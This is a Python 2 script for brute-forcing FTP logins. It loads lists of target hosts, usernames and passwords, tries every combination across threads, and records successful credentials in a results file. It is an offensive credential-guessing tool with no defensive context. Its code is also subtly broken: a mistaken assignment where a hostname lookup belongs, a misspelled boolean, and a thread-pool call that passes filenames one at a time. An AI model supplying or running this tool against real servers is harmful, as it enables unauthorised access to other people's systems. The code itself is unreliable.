#!/usr/bin/env python
#-*- coding: utf-8 -*-

import ftplib
import sys
import os
import optparse
from threading import Thread
from multiprocessing import Pool as ThreadPool

def bruteLoginFunc(ListFile):

	hostFileName=ListFile[0]
	userFileName=ListFile[1]
	passwdFileName=ListFile[2]
	
	ResultFile=str(hostFileName)+"_result.txt"
	ResultFileFp=open(ResultFile,"w")

	with open(hostFileName,"r") as hostFileNameFp:
		for hostline in hostFileNameFp:
			hostname=hostline.split()[0]
			try:
				hostip=gethostbyname=(hostname)
			except Exception, e:
				continue

			EveryHostFlag=falase
			#try every user
			with open(userFileName,"r") as userFileNameFp:
				for userline in userFileNameFp:
					if EveryHostFlag==False:
						username=userline.split()[0]
						#try everypassword
						with open(passwdFileName,"r") as passwdFileNameFp:
							for passwd in passwdFileNameFp:
							 	password=passwd.split()[0]
							 	try:
							 		ftp=ftplib.FTP(hostip)
							 		ftp.login(username,password)
							 		print '\n[+] '+str(hostip)+' FTP Logon Succeeded: '+username+'/'+password
							 		ResultFileFp.writelines(str("[+] IP:")+hostip+":"+username+"/"+password+"\n")
							 		EveryHostFlag=True
							 	except Exception, e:
							 		pass
					else:
						break		 			
	#close Fp	
	ResultFileFp.close()
def main():
	parser=optparse.OptionParser('usage:%prog --HF <target host file> --UF <username dict file> --PF <password dict file> -t <brute threads>')
	parser.add_option('--HF',dest='BruteHostFile',type='string',help='specify the brute host file')
	parser.add_option('--UF',dest='BruteUserFile',type='string',help='specify the brute username file')
	parser.add_option('--PF',dest='BrutePwdFile',type='string',help='specify the brute password file')
	parser.add_option('-t',dest='BruteThead',type='string',help='specify the thread to brute')
	(options,args)=parser.parse_args()
	bruteHostFile=options.BruteHostFile
	bruteUserFile=options.BruteUserFile
	brutePwdFile=options.BrutePwdFile
	bruteThread=options.BruteThead

	if bruteHostFile==None or bruteUserFile==None or brutePwdFile==None or bruteThread==None: 
		print parser.usage
		exit(0)

	
	pool =ThreadPool(int(bruteThread))
	print 'Scanning......'
	
	files=[bruteHostFile,bruteUserFile,brutePwdFile]

	pool.map(bruteLoginFunc,files)
	pool.close()

if __name__ == '__main__':
	main()



